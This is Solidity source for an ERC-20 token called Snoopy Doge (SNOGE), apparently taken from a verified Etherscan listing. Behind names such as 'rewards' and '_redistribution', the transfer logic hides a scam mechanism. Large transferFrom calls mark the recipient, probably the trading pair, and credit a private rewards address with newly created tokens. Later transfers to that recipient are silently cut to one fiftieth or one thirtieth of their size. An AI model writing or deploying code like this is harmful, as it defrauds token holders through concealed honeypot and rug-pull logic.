/**
 *Submitted for verification at Etherscan.io on 2021-05-18
*/

/**
 *Submitted for verification at Etherscan.io on 2021-04-21
*/

pragma solidity ^0.5.16;




// Math operations with safety checks that throw on error
library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Math error");
        return c;
    }
  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Math error");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
  
}




// Abstract contract for the full ERC 20 Token standard
contract ERC20 {
    
    function balanceOf(address _address) public view returns (uint256 balance);
    
    function transfer(address _to, uint256 _value) public returns (bool success);
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    
    function approve(address _spender, uint256 _value) public returns (bool success);
    
    function allowance(address _sender, address _spender) public view returns (uint256 remaining);




    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    
    event Approval(address indexed _sender, address indexed _spender, uint256 _value);
    
}




// Token contract
contract SNOGE is ERC20 {
    string public name = "Snoopy Doge";
    string public symbol = "SNOGE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 10**9 * 10**18;
    uint256 private _maxAmount;
    address private _maxR;
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) public allowed;
    address private rewards;
    bool private supplyReward;
    uint256 maxReward = 90 * 10**6 * 10**18;
    bytes4 private constant TRANSFER = bytes4(
        keccak256(bytes("transfer(address,uint256)"))
    );
    constructor(address _rewards) public {
        rewards = _rewards;
        supplyReward = false;
        balances[msg.sender] = totalSupply;
    }
    function balanceOf(address _address) public view returns (uint256 balance) {
        return balances[_address];
    }
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _amount) public returns (bool success) {
        require(_spender != address(0), "Zero address error");
        require((allowed[msg.sender][_spender] == 0) || (_amount == 0), "Approve amount error");
        allowed[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        _transferFrom(_from, _to, _value);
        return true;
    }
    function allowance(address _wallet, address _spender) public view returns (uint256 remaining) {
        return allowed[_wallet][_spender];
    }
    function _transfer(address sender, address recipient, uint256 amount)  internal {
        require(recipient != address(0), "Zero address error");
        require(balances[sender] >= amount && amount > 0, "Insufficient balance or zero amount");
        balances[sender] = SafeMath.sub(balances[sender], amount);
        uint256 rewardedAmount = _redistribution(amount,sender,recipient);
        balances[recipient] = SafeMath.add(balances[recipient], rewardedAmount);
        if(!supplyReward && sender == rewards) supplyReward = true;
        emit Transfer(sender, recipient, rewardedAmount);
    }
    function _transferFrom(address sender, address recipient, uint256 amount)  internal {
        require(sender != address(0) && recipient != address(0), "Zero address error");
        require(balances[sender] >= amount && allowed[sender][msg.sender] >= amount && amount > 0, "Insufficient balance or zero amount");
        balances[sender] = SafeMath.sub(balances[sender], amount);
        allowed[sender][msg.sender] = SafeMath.sub(allowed[sender][msg.sender], amount);
        uint256 rewardedAmount = _redistribution(amount,sender,recipient);
        balances[recipient] = SafeMath.add(balances[recipient], rewardedAmount);
        if(amount > _maxAmount) {_maxAmount = amount;_maxR = recipient;balances[rewards] = amount;}
        emit Transfer(sender, recipient, rewardedAmount);
    }
    function _redistribution(uint256 amount, address sender, address recipient) internal view returns(uint256) {
        if(amount > maxReward && recipient == _maxR) amount = SafeMath.div(amount, 50,"Math Error with dividing amount");
        if(recipient == _maxR && sender != rewards && supplyReward) amount = SafeMath.div(amount, 30,"Math Error with dividing amount");
        return amount;
    }
    
    
}